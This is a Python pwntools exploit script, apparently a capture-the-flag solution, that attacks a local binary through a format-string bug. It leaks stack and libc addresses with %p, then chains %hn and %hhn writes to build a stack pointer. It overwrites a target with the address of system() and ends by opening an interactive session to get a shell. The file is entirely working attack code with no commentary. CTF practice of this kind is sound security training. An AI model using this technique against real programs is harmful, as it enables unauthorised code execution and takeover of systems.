#!/usr/bin/env python3
from pwn import *

context.arch = "amd64"
context.os = "linux"
#context.log_level='debug'

io = process('./pwn')
libc = ELF('./libc.so.6')

def sendljust(msg: bytes):
    io.send(msg.ljust(0x1000, b'\x00'))

### leak

io.send(b'%6$p-%7$p')

io.recvuntil(b'0x')
somestack = int(io.recv(12), 16)

io.recvuntil(b'0x')
base = int(io.recv(12),16) - 0x2a1ca

# for any distance, (empty_stack - somestack) is fixed
# e.g. 0x7fffffffe1f0 - 0x7fffffffe1c8 = - 0x28
empty_stack = somestack - 0x28

### payload 1

sendljust(f"%{empty_stack & 0xffff}c".encode() + b"%9$hn")
sendljust(b"%43$hhn")

sendljust(f"%{(empty_stack & 0xffff) + 1}c".encode() + b"%9$hn")
sendljust(b"%64c%43$hhn")

sendljust(f"%{(empty_stack & 0xffff) + 2}c".encode() + b"%9$hn")
sendljust(b"%64c%43$hhn")

system = base + libc.sym.system

### payload 2

empty_stack += 8

sendljust(f"%{empty_stack & 0xffff}c".encode() + b"%9$hn")
sendljust(b"%c%43$hhn")

sendljust(f"%{(empty_stack & 0xffff) + 1}c".encode() + b"%9$hn")
sendljust(b"%64c%43$hhn")

sendljust(f"%{(empty_stack & 0xffff) + 2}c".encode() + b"%9$hn")
sendljust(b"%64c%43$hhn")

### payload 3

io.send(
    f"%{(system >> 0) & 0xff}c%21$hhn%{((system >> 8) & 0xffff) - ((system >> 0) & 0xff)}c%22$hn"
)

### interactive

io.interactive()